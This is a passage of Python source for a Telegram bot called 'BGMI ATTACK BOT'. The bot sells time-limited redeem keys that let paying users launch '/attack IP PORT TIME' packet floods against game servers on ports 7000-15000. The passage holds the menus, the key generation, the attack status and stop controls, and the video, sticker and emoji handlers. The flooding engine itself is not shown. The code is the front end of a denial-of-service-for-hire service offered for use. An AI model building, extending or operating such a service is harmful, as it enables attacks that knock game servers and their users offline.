        f"🔑 {premium_text('How To Redeem Key?', 5)}\n\n"
        f"1️⃣ {premium_text('Get Key From Admin', 1)}\n"
        f"📲 @{OWNER_USERNAME}\n\n"
        f"2️⃣ {premium_text('Use Command:', 3)}\n"
        "/redeem YOUR_KEY\n\n"
        f"3️⃣ {premium_text('Example:', 3)}\n"
        "/redeem BGMI-XXXX-XXXX-XXXX\n\n"
        f"⏱️ {premium_text('Durations:', 3)}\n"
        "30m • 1h • 24h • 7d • 2w • 1mo\n\n"
        f"💎 {premium_text('Premium = Power!', 5)}",
        show_alert=True
    )

# ═══════════════ COMMANDS BUTTON HANDLER ═══════════════
@app.on_callback_query(filters.regex("commands_menu"))
async def commands_menu_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    commands_text = get_commands_list(is_owner)
    formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
    await cb.message.edit_text(formatted_text, reply_markup=back_to_menu_kb(is_owner))
    await cb.answer("📝 Commands List")

# ═══════════════ COMMANDS COMMAND ═══════════════
@app.on_message(filters.command("commands") & filters.private)
async def commands_cmd(client, msg):
    uid = msg.from_user.id
    is_owner = (uid == OWNER_ID)
    commands_text = get_commands_list(is_owner)
    formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
    await msg.reply_text(formatted_text, reply_markup=back_to_menu_kb(is_owner))

# ═══════════════ MAIN CALLBACK ═══════════════
@app.on_callback_query(filters.regex("menu"))
async def menu_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    await cb.answer("⌂ Main Menu")
    user = cb.from_user
    info = get_user_info(uid)
    kb = main_menu_kb(is_owner)
    
    expiry_text = ""
    if info.get("remaining"): expiry_text += f"\n⏳ {premium_text('Remaining:', 3)} {info['remaining']}"
    if info.get("expiry"):
        try:
            exp = datetime.fromisoformat(info["expiry"])
            expiry_text += f"\n📅 {premium_text('Expires:', 3)} {exp.strftime('%d %b %Y, %I:%M %p')}"
        except: pass
    
    text = (
        f"💀 {premium_text('BGMI ATTACK BOT', 5)} 💀\n\n"
        f"{LINE}\n"
        f"👤 {user.first_name}\n"
        f"🆔 {uid}\n"
        f"💳 {info['type']}{expiry_text}\n"
        f"{LINE}\n"
        f"⚡ {info['threads']} {premium_text('Threads', 1)}\n"
        f"⏱️ {info['max_time']}s {premium_text('Max Time', 1)}\n"
        f"📹 {len(get_vids())} {premium_text('Videos', 1)}\n"
        f"{LINE}\n"
        "⚔️ /attack IP PORT TIME\n"
        "📋 /attack 1.2.3.4 8080 600\n"
        f"🎮 {premium_text('BGMI Ports:', 3)} 7000-15000\n"
        f"{LINE}\n"
        f"🔽 {premium_text('SELECT OPTION', 5)}:"
    )
    await cb.message.edit_text(text, reply_markup=kb)

# ═══════════════ OTHER CALLBACKS ═══════════════
@app.on_callback_query(filters.regex("sep"))
async def sep_callback(client, cb: CallbackQuery):
    await cb.answer()

@app.on_callback_query(filters.regex("status_btn"))
async def status_callback(client, cb: CallbackQuery):
    if attacking:
        e = time.time() - ainfo['start']
        await cb.answer(
            f"🟢 {premium_text('ATTACKING', 5)}\n"
            f"⏱️ {int(e)}s\n"
            f"📦 {attacker.pkts:,} {premium_text('pkts', 1)}",
            show_alert=True
        )
    else:
        await cb.answer(
            f"💤 {premium_text('IDLE', 5)}\n\n"
            f"✅ {premium_text('No attack running', 1)}",
            show_alert=True
        )

@app.on_callback_query(filters.regex("attack_menu"))
async def attack_menu_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    access, a_type = check_access(uid)
    
    if not access:
        await cb.answer("🔒 Access Denied!", show_alert=True)
        return
    
    info = get_user_info(uid)
    text = (
        f"💀 **{premium_text('ATTACK MENU', 5)}**\n\n"
        f"{LINE}\n"
        f"⚔️ /attack IP PORT TIME\n"
        f"📋 /attack 1.2.3.4 8080 600\n"
        f"{LINE}\n"
        f"🎮 {premium_text('BGMI:', 3)} 7000-15000\n"
        f"⚡ {info['threads']} {premium_text('Threads', 1)}\n"
        f"⏱️ {info['max_time']}s {premium_text('Max (10 Minutes)', 1)}\n"
        f"💳 {a_type}"
    )
    await cb.message.edit_text(text, reply_markup=back_to_menu_kb(is_owner))
    await cb.answer("⚔ Attack Menu")

@app.on_callback_query(filters.regex("info_menu"))
async def info_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    info = get_user_info(uid)
    history = get_user_history(uid)
    
    text = f"ⓘ **{premium_text('USER INFO', 5)}**\n\n{LINE}\n👤 {cb.from_user.first_name}\n🆔 {uid}\n💳 {info['type']}\n"
    if info.get("remaining"): text += f"⏳ {premium_text('Remaining:', 3)} {info['remaining']}\n"
    if info.get("expiry"):
        try:
            exp = datetime.fromisoformat(info["expiry"])
            text += f"📅 {premium_text('Expires:', 3)} {exp.strftime('%d %b, %I:%M %p')}\n"
        except: pass
    text += f"\n{LINE}\n▓ **{premium_text('ATTACK HISTORY', 5)}:**\n"
    if history:
        for h in history[-5:]:
            try:
                t = datetime.fromisoformat(h['time']).strftime('%d %b %I:%M %p')
                text += f"• {t} - {h['action']}\n  {h['details'][:40]}\n"
            except: pass
    else:
        text += f"• {premium_text('No attacks yet!', 1)}\n"
    text += f"\n{LINE}\n📹 {premium_text('Videos:', 3)} {len(get_vids())}"
    
    await cb.message.edit_text(text, reply_markup=back_to_menu_kb(is_owner))
    await cb.answer("ⓘ User Info")

@app.on_callback_query(filters.regex("redeem_menu"))
async def redeem_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    access, a_type = check_access(uid)
    
    if access:
        info = get_user_info(uid)
        await cb.message.edit_text(
            f"✅ **{premium_text('ACCESS ACTIVE', 5)}**\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\n{premium_text('Use /attack to start!', 3)}",
            reply_markup=back_to_menu_kb(is_owner)
        )
    else:
        await cb.message.edit_text(
            f"⚿ **{premium_text('REDEEM KEY', 5)}**\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 [FATHER OF BOT]({OWNER_LINK})\n\n⏱️ 30m | 24h | 7d | 2w | 1mo",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🪪 {premium_text('About Redeem', 5)} ♡", callback_data="redeem_popup")],
                [InlineKeyboardButton("📲 Contact-Father", url=OWNER_LINK)],
                [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
            ])
        )
    await cb.answer("⚿ Redeem Menu")

# ═══════════════ ADMIN CALLBACKS ═══════════════
@app.on_callback_query(filters.regex("admin_menu"))
async def admin_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    if uid != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⚜ **{premium_text('ADMIN PANEL', 5)}**\n\n{LINE}\n🔽 {premium_text('Select:', 3)}",
        reply_markup=admin_kb()
    )
    await cb.answer("⚜ Admin Panel")

@app.on_callback_query(filters.regex("admin_auto"))
async def admin_auto_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    if uid != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⚜ **{premium_text('AUTO GEN KEY', 5)}**\n\n{LINE}\n🔽 {premium_text('Select Duration:', 3)}",
        reply_markup=auto_key_kb()
    )
    await cb.answer("⚜ Auto Generate Key")

@app.on_callback_query(filters.regex("admin_addkey"))
async def admin_addkey_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    if uid != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    await cb.answer(
        f"⚿ {premium_text('ADD KEY', 5)}\n\n"
        f"{premium_text('Use:', 3)} /genkey NAME TIME\n\n"
        f"{premium_text('Examples:', 3)}\n"
        "/genkey Test 30m\n"
        "/genkey VIP 24h\n"
        "/genkey Premium 7d\n\n"
        f"{premium_text('Units:', 3)} m=min, h=hour, d=day, w=week, mo=month",
        show_alert=True
    )

@app.on_callback_query(filters.regex("admin_keys"))
async def admin_keys_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    if uid != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    keys = get_keys()
    active = [k for k, v in keys.items() if v["active"]]
    used = [k for k, v in keys.items() if not v["active"]]
    await cb.message.edit_text(
        f"⌘ **{premium_text('ALL KEYS', 5)}**\n\n{LINE}\n"
        f"🟢 {premium_text('Active:', 3)} {len(active)}\n"
        f"🔴 {premium_text('Used:', 3)} {len(used)}\n"
        f"📊 {premium_text('Total:', 3)} {len(keys)}\n{LINE}",
        reply_markup=admin_kb()
    )
    await cb.answer("⌘ All Keys")

@app.on_callback_query(filters.regex("admin_stats"))
async def admin_stats_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    if uid != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    vids = get_vids()
    users = get_users()
    await cb.message.edit_text(
        f"⎙ **{premium_text('STATS', 5)}**\n\n{LINE}\n"
        f"📹 {premium_text('Videos:', 3)} {len(vids)}\n"
        f"💎 {premium_text('Premium:', 3)} {len(users.get('premium', []))}\n"
        f"🔑 {premium_text('Key Users:', 3)} {len(users.get('keys', {}))}\n"
        f"⚡ {premium_text('Attack:', 3)} {'🟢 On' if attacking else '💤 Idle'}\n"
        f"{LINE}\n"
        f"⚙️ {premium_text('Settings:', 3)}\n"
        f"⏱️ {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
        f"⏱️ {premium_text('Video Delay:', 5)} {get_video_delay_time()}s",
        reply_markup=admin_kb()
    )
    await cb.answer("⎙ Statistics")

@app.on_callback_query(filters.regex("admin_clear"))
async def admin_clear_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    if uid != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    removed = remove_expired()
    await cb.answer(f"↺ {removed} expired removed!", show_alert=True)

# ═══════════════ VIDEO CALLBACKS ═══════════════
@app.on_callback_query(filters.regex("video_menu"))
async def video_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    if uid != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    vids = get_vids()
    await cb.message.edit_text(
        f"▶ **{premium_text('VIDEO MANAGER', 5)}**\n\n"
        f"🔹 {premium_text('Total Videos:', 3)} {len(vids)}\n"
        f"🔹 {premium_text('Commands:', 3)}\n"
        f"• `/addvideo` - {premium_text('Reply to video', 1)}\n"
        f"• `/delvideo ID` - {premium_text('Delete by ID', 2)}\n"
        f"• `/videos` - {premium_text('List all videos', 3)}\n"
        f"• `/clearvideos` - {premium_text('Clear all', 4)}\n"
        f"• `/setvideodelay seconds` - {premium_text('Set video delay', 5)}\n\n"
        f"⏱️ **{premium_text('Video Delay:', 3)}** {get_video_delay_time()}s\n"
        f"✨ {premium_text('Videos appear randomly in welcome animation!', 1)}",
        reply_markup=video_kb()
    )
    await cb.answer("▶ Video Manager")

# ═══════════════ OTHER VIDEO CALLBACKS ═══════════════
@app.on_callback_query(filters.regex("v_add"))
async def v_add_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⎘ **{premium_text('ADD VIDEO', 5)}**\n\n"
        f"{premium_text('Reply to a video with:', 3)}\n"
        "`/addvideo`\n\n"
        f"✨ {premium_text('The video will be added to welcome animation!', 1)}",
        reply_markup=video_kb()
    )
    await cb.answer("⎘ Add Video")

@app.on_callback_query(filters.regex("v_del"))
async def v_del_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    vids = get_vids()
    if not vids:
        await cb.answer("No videos to delete!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⌫ **{premium_text('DELETE VIDEO', 5)}**\n\n"
        f"{premium_text('Use:', 3)} `/delvideo ID`\n\n"
        f"{premium_text('Get ID from', 1)} `/videos` {premium_text('command.', 2)}",
        reply_markup=video_kb()
    )
    await cb.answer("⌫ Delete Video")

@app.on_callback_query(filters.regex("v_list"))
async def v_list_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    vids = get_vids()
    if not vids:
        await cb.answer("No videos added yet!", show_alert=True)
        return
    text = f"⌘ **{premium_text('VIDEO LIST', 5)}**\n\n"
    for v in vids[:15]:
        text += f"#{v['id']} {v['name'][:30]}\n"
    text += f"\n🔹 **{premium_text('Total:', 3)}** {len(vids)}"
    text += f"\n⏱️ {premium_text('Video Delay:', 3)} {get_video_delay_time()}s"
    await cb.message.edit_text(text, reply_markup=video_kb())
    await cb.answer("⌘ Video List")

@app.on_callback_query(filters.regex("v_clear"))
async def v_clear_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    n = clear_vids()
    await cb.answer(f"🗑️ {n} videos cleared!", show_alert=True)
    await cb.message.edit_text(
        f"⎚ **{premium_text('VIDEOS CLEARED', 5)}**\n\n"
        f"🔹 {premium_text('Total Videos:', 3)} 0",
        reply_markup=video_kb()
    )

@app.on_callback_query(filters.regex("v_help"))
async def v_help_callback(client, cb: CallbackQuery):
    await cb.message.edit_text(
        f"❓ **{premium_text('VIDEO HELP', 5)}**\n\n"
        f"{LINE}\n"
        f"📤 {premium_text('Add:', 3)} {premium_text('Reply + /addvideo', 1)}\n"
        f"📋 {premium_text('List:', 3)} {premium_text('/videos', 2)}\n"
        f"🗑️ {premium_text('Delete:', 3)} {premium_text('/delvideo ID', 3)}\n"
        f"🧹 {premium_text('Clear:', 3)} {premium_text('/clearvideos', 4)}\n"
        f"⏱️ {premium_text('Set Delay:', 3)} {premium_text('/setvideodelay seconds', 5)}\n"
        f"{LINE}",
        reply_markup=video_kb()
    )
    await cb.answer("❓ Video Help")

# ═══════════════ EMOJI CALLBACKS ═══════════════
@app.on_callback_query(filters.regex("emoji_menu"))
async def emoji_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    emojis = get_all_emojis()
    await cb.message.edit_text(
        f"★ **{premium_text('EMOJI MANAGER', 5)}**\n\n"
        f"🔹 {premium_text('Total Emojis:', 3)} {len(emojis)}\n"
        f"🔹 {premium_text('Commands:', 3)}\n"
        f"• `/addemoji` - {premium_text('Reply to premium emoji', 1)}\n"
        f"• `/removeemoji index` - {premium_text('Remove by index', 2)}\n"
        f"• `/listemojis` - {premium_text('List all emojis', 3)}\n"
        f"• `/resetemojis` - {premium_text('Reset all', 4)}\n\n"
        f"✨ {premium_text('Emojis appear randomly in welcome animation!', 1)}",
        reply_markup=emoji_kb()
    )
    await cb.answer("★ Emoji Manager")

@app.on_callback_query(filters.regex("e_add"))
async def e_add_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⎘ **{premium_text('ADD EMOJI', 5)}**\n\n"
        f"{premium_text('Reply to a premium emoji with:', 3)}\n"
        "`/addemoji`\n\n"
        f"✨ {premium_text('The emoji will be added to welcome animation!', 1)}",
        reply_markup=emoji_kb()
    )
    await cb.answer("⎘ Add Emoji")

@app.on_callback_query(filters.regex("e_remove"))
async def e_remove_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    emojis = get_all_emojis()
    if not emojis:
        await cb.answer("No emojis to remove!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⌫ **{premium_text('REMOVE EMOJI', 5)}**\n\n"
        f"{premium_text('Use:', 3)} `/removeemoji index`\n\n"
        f"{premium_text('Get index from', 1)} `/listemojis` {premium_text('command.', 2)}",
        reply_markup=emoji_kb()
    )
    await cb.answer("⌫ Remove Emoji")

@app.on_callback_query(filters.regex("e_list"))
async def e_list_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    emojis = get_all_emojis()
    if not emojis:
        await cb.answer("No emojis added yet!", show_alert=True)
        return
    text = f"⌘ **{premium_text('EMOJI LIST', 5)}**\n\n"
    for i, emoji_id in enumerate(emojis, 1):
        text += f"**{i}.** `{emoji_id[:30]}...`\n"
    text += f"\n🔹 **{premium_text('Total:', 3)}** {len(emojis)}"
    await cb.message.edit_text(text, reply_markup=emoji_kb())
    await cb.answer("⌘ Emoji List")

@app.on_callback_query(filters.regex("e_reset"))
async def e_reset_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    reset_emojis()
    await cb.answer("🔄 All emojis reset!", show_alert=True)
    await cb.message.edit_text(
        f"↺ **{premium_text('EMOJIS RESET', 5)}**\n\n"
        f"🔹 {premium_text('Total Emojis:', 3)} 0\n\n"
        f"{premium_text('All emojis removed from the list.', 1)}",
        reply_markup=emoji_kb()
    )

# ═══════════════ STICKER CALLBACKS ═══════════════
@app.on_callback_query(filters.regex("sticker_menu"))
async def sticker_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    stickers = get_all_stickers()
    sticker_times = get_sticker_times()
    text = f"❄ **{premium_text('STICKER MANAGER', 5)}**\n\n"
    text += f"🔹 {premium_text('Total Stickers:', 3)} {len(stickers)}\n"
    if stickers:
        text += f"🔹 {premium_text('Sticker Times:', 3)}\n"
        for i, sid in enumerate(stickers[:5], 1):
            time = sticker_times.get(sid, get_sticker_display_time())
            text += f"   #{i}: {time}s\n"
    text += f"\n🔹 {premium_text('Commands:', 3)}\n"
    text += f"• `/addsticker` - {premium_text('Reply to sticker (Auto-detect)', 1)}\n"
    text += f"• `/removesticker index` - {premium_text('Remove by index', 2)}\n"
    text += f"• `/liststickers` - {premium_text('List all stickers', 3)}\n"
    text += f"• `/resetstickers` - {premium_text('Reset all', 4)}\n"
    text += f"• `/setstickertime index seconds` - {premium_text('Set single sticker', 5)}\n"
    text += f"• `/setallstickertime seconds` - {premium_text('Set ALL stickers', 1)}\n\n"
    text += f"⏱️ **{premium_text('Default Time:', 3)}** {get_sticker_display_time()}s\n"
    text += f"⏱️ **{premium_text('Video Delay:', 3)}** {get_video_delay_time()}s\n"
    text += f"✨ {premium_text('Stickers appear randomly in welcome animation!', 1)}"
    await cb.message.edit_text(text, reply_markup=sticker_kb())
    await cb.answer("❄ Sticker Manager")

@app.on_callback_query(filters.regex("s_add"))
async def s_add_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⎘ **{premium_text('ADD STICKER', 5)}**\n\n"
        f"{premium_text('Reply to a sticker with:', 3)}\n"
        "`/addsticker`\n\n"
        f"⏱️ **{premium_text('Auto-Detect:', 3)}** {premium_text('Duration will be detected automatically!', 1)}\n"
        f"✨ {premium_text('The sticker will be added to welcome animation!', 2)}",
        reply_markup=sticker_kb()
    )
    await cb.answer("⎘ Add Sticker")

@app.on_callback_query(filters.regex("s_remove"))
async def s_remove_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    stickers = get_all_stickers()
    if not stickers:
        await cb.answer("No stickers to remove!", show_alert=True)
        return
    await cb.message.edit_text(
        f"⌫ **{premium_text('REMOVE STICKER', 5)}**\n\n"
        f"{premium_text('Use:', 3)} `/removesticker index`\n\n"
        f"{premium_text('Get index from', 1)} `/liststickers` {premium_text('command.', 2)}",
        reply_markup=sticker_kb()
    )
    await cb.answer("⌫ Remove Sticker")

@app.on_callback_query(filters.regex("s_list"))
async def s_list_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    stickers = get_all_stickers()
    if not stickers:
        await cb.answer("No stickers added yet!", show_alert=True)
        return
    sticker_times = get_sticker_times()
    text = f"⌘ **{premium_text('STICKER LIST', 5)}**\n\n"
    for i, sticker_id in enumerate(stickers, 1):
        time = sticker_times.get(sticker_id, get_sticker_display_time())
        text += f"**{i}.** `{sticker_id[:25]}...` ⏱️ {time}s\n"
    text += f"\n🔹 **{premium_text('Total:', 3)}** {len(stickers)}"
    text += f"\n\n📋 **{premium_text('Settings:', 3)}** {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s | {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
    await cb.message.edit_text(text, reply_markup=sticker_kb())
    await cb.answer("⌘ Sticker List")

@app.on_callback_query(filters.regex("s_reset"))
async def s_reset_callback(client, cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Owner only!", show_alert=True)
        return
    reset_stickers()
    await cb.answer("🔄 All stickers reset!", show_alert=True)
    await cb.message.edit_text(
        f"↺ **{premium_text('STICKERS RESET', 5)}**\n\n"
        f"🔹 {premium_text('Total Stickers:', 3)} 0\n\n"
        f"{premium_text('All stickers removed from the list.', 1)}",
        reply_markup=sticker_kb()
    )

# ═══════════════ AUTO KEY CALLBACKS ═══════════════
auto_keys = {
    "ak_20m": ("20min", "20m"), "ak_40m": ("40min", "40m"), "ak_60m": ("60min", "60m"),
    "ak_1d": ("1day", "1d"), "ak_3d": ("3day", "3d"), "ak_7d": ("7day", "7d"),
    "ak_15d": ("15day", "15d"), "ak_23d": ("23day", "23d"), "ak_30d": ("30day", "30d"),
    "ak_1mo": ("1month", "1mo"), "ak_2mo": ("2month", "2mo"), "ak_3mo": ("3month", "3mo"),
}

@app.on_callback_query()
async def auto_key_callback(client, cb: CallbackQuery):
    data = cb.data
    if data in auto_keys:
        uid = cb.from_user.id
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        name, time_str = auto_keys[data]
        key_code, duration = create_key(name, time_str)
        if key_code:
            await cb.message.edit_text(
                f"⚿ **{premium_text('KEY GENERATED', 5)}**\n\n{LINE}\n🪪 {name}\n⏱️ {duration}\n🔑 {key_code}\n{LINE}\n\n📋 {premium_text('User:', 3)} /redeem {key_code}",
                reply_markup=auto_key_kb()
            )
            await cb.answer("✅ Key Generated!")
        else:
            await cb.answer("❌ Failed!", show_alert=True)

# ═══════════════ STOP ATTACK CALLBACK ═══════════════
@app.on_callback_query(filters.regex("stop_attack"))
async def stop_attack_callback(client, cb: CallbackQuery):
    global attacking
    uid = cb.from_user.id
    
    if not check_access(uid)[0]:
        await cb.answer("🔒 Access Denied!", show_alert=True)
        return
    
    if attacking and (uid == attack_user or uid == OWNER_ID):
        stop_sticker = get_stop_sticker()
        if stop_sticker:
            try:
                await cb.message.reply_sticker(stop_sticker)
            except:
                pass
        
        attacker.on = False
        attacking = False
        
        await cb.answer("✅ Attack Stopped!", show_alert=True)
        await cb.message.edit_text(
            f"✅ **{premium_text('ATTACK TERMINATED', 5)}**\n\n"
            f"╔══════════════════════════╗\n"
            f"║  ✅ {premium_text('Target Neutralized', 3)} ║\n"
            f"║  📦 {attacker.pkts:,} {premium_text('Packets', 1)}  ║\n"
            f"║  🛑 {premium_text('Attack Stopped', 3)}     ║\n"
            f"╚══════════════════════════╝\n\n"
            f"🔄 /attack IP PORT TIME"
        )
    else:
        await cb.answer("💤 No attack running!", show_alert=True)

# ═══════════════ COMMANDS FOR OTHER FEATURES ═══════════════
@app.on_message(filters.command("addstop") & filters.private)
async def add_stop_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.sticker:
        return await msg.reply_text(
            f"⛔ **{premium_text('ADD STOP STICKER', 5)}**\n\n"
            f"{premium_text('Reply to a sticker with:', 3)}\n"
            "`/addstop`\n\n"
            f"✨ {premium_text('This sticker will appear when you use /stop command!', 1)}",
            reply_markup=back_to_menu_kb(True)
        )
    
    sticker_id = msg.reply_to_message.sticker.file_id
    set_stop_sticker(sticker_id)
    
    await msg.reply_text(
        f"✅ **{premium_text('STOP STICKER ADDED', 5)}** 🎉\n\n"
        f"🔹 {premium_text('Now this sticker will appear when using /stop command!', 1)}\n"
        f"📋 {premium_text('Use /removestop to remove it.', 3)}",
        reply_markup=back_to_menu_kb(True)
    )

@app.on_message(filters.command("removestop") & filters.private)
async def remove_stop_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    clear_stop_sticker()
    await msg.reply_text(
        f"✅ **{premium_text('STOP STICKER REMOVED', 5)}**\n\n"
        f"🔹 {premium_text('No sticker will appear for /stop command now.', 1)}",
        reply_markup=back_to_menu_kb(True)
    )

# ═══════════════ SEND VIDEO HELPER ═══════════════
async def send_vid(chat_id, text, kb=None, vid=None):
    if vid is None: vid = rand_vid()
    try:
        if vid and os.path.exists(vid["path"]):
            return await app.send_video(chat_id, vid["path"], caption=text, reply_markup=kb)
        return await app.send_message(chat_id, text, reply_markup=kb)
    except:
        return await app.send_message(chat_id, text, reply_markup=kb)

# ═══════════════ AUTO EXPIRE ═══════════════
async def auto_expire():
    while True:
        await asyncio.sleep(300)
        remove_expired()

# ═══════════════ INIT ═══════════════
for f, d in [
    (VIDEO_DB, []), 
    (USERS_DB, {"premium": [], "keys": {}}), 
    (KEYS_DB, {}), 
    (BLOCKED_DB, []), 
    (HISTORY_DB, {}), 
    (STICKER_DB, {"stickers": []}),
    (EMOJI_DB, {"emojis": []}),
    (STICKER_TIME_DB, {}),
    (SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY}),
    (STOP_STICKER_DB, {"sticker_id": None})
]:
    if not os.path.exists(f): jsave(f, d)

os.makedirs("downloads", exist_ok=True)
asyncio.get_event_loop().create_task(auto_expire())

print("""
╔══════════════════════════════════════╗
║  💀 BGMI ATTACK BOT - ULTRA PRO     ║
║  ✅ COMMANDS BUTTON FIXED           ║
║  ✅ USER/OWNER COMMANDS SEPARATE    ║
║  ✅ ALL CALLBACKS WORKING           ║
║  ✅ REDEEM POPUP WORKING            ║
║  ✅ STOP STICKER SEPARATE           ║
║  ✅ ALL BUTTONS WORKING             ║
║  SIRF INLINE BUTTONS                ║
╚══════════════════════════════════════╝
✅ Bot Ready!
""")

if __name__ == "__main__":
    app.run()
